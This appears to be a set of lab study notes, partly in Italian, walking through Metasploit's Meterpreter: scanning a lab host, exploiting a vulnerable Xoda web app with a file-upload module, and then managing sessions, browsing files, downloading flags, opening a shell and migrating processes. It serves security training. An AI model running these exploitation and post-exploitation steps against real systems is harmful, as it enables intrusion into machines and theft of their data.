# Meterpreter Fundamentals

<figure><img src="../../../.gitbook/assets/image (1140).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1141).png" alt=""><figcaption></figcaption></figure>

## Meterpreter

```
service postgresql start
msfconsole
workspace -a meterpreter
setg RHOSTS 192.3.56.3
```

## Enumeration

```
db_nmap -sV 192.3.56.3
```

<figure><img src="../../../.gitbook/assets/image (1142).png" alt=""><figcaption></figcaption></figure>

## Exploitation

```
curl http://192.3.56.3 //vediamo che sul target è presente Xoda come webapp, che è vulnerabile
search xoda
use exploit/unix/webapp/xoda_file_upload
show options
set TARGETURI /
run
```

<figure><img src="../../../.gitbook/assets/image (1143).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1144).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1145).png" alt=""><figcaption></figcaption></figure>

## Post exploitation

```
sysinfo
getuid
help

```

<figure><img src="../../../.gitbook/assets/image (1146).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1147).png" alt=""><figcaption></figcaption></figure>

### Session

Siamo in una meterpreter session

```
background //oppure CTRL+Z
kill //killa la sessione
sessions //permette di gestire tutte le sessioni attive
sessions -h
sessions -C sysinfo -i 1  //Per eseguire un comando su una meterpreter, senza renderla interattiva
sessions 1
background
sessions -h
sessions -k 1 //per killare la sessione 1
sessions -l //lista le sessioni attive
sessions -n xoda -i 1 //assegna un nome ad una sessione
sessions xoda //per interagire con essa
```

<figure><img src="../../../.gitbook/assets/image (1148).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1149).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

### Navigare il file system

```
ls 
pwd 
cd ..
ls
cat flag1
edit flag1 //apre il file in vim, chiudi con :q
cd "Secret Files"
cat .flag2
cd ..
ls
downlad flag5.zip
CTRL+Z
ls
unzip flag5.zip
ls
cat list //il file estratto, che ci dice di guardare l'MD5 hash di /bin/bash. Quindi torniamo nella meterpreter session
checksum md5 /bin/bash //e l'output è la flag
getenv PATH //per enumerare vairabili d'ambiente come PATH
getenv TERM //il terminale assegnato a questo utente, valido per utenti che possono accedere tramite terminale
search -d /usr/bin -f *backdoor*
search -f *.php
download flag1
sessions 1
mkdir test
rmdir test
```

<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1153).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1154).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1155).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1156).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1164).png" alt=""><figcaption></figcaption></figure>

### Altri comandi meterpreter utili

```
shell //per ottenere una shell del SO, per eseguire i comandi
CTRL+C //per terminare la shell e tornare a meterpreter
ps //lista i processi running sul sistema
migrate 580 //per migrare a processi ai quali abbiamo permesso
migrate -N apache2 //per migrare a processi con il loro nome invece del PID
execute -f ifconfig //crea un processo ed esegue direttamente il comando
```

<figure><img src="../../../.gitbook/assets/image (1157).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1158).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1159).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1160).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1161).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1162).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1163).png" alt=""><figcaption></figcaption></figure>
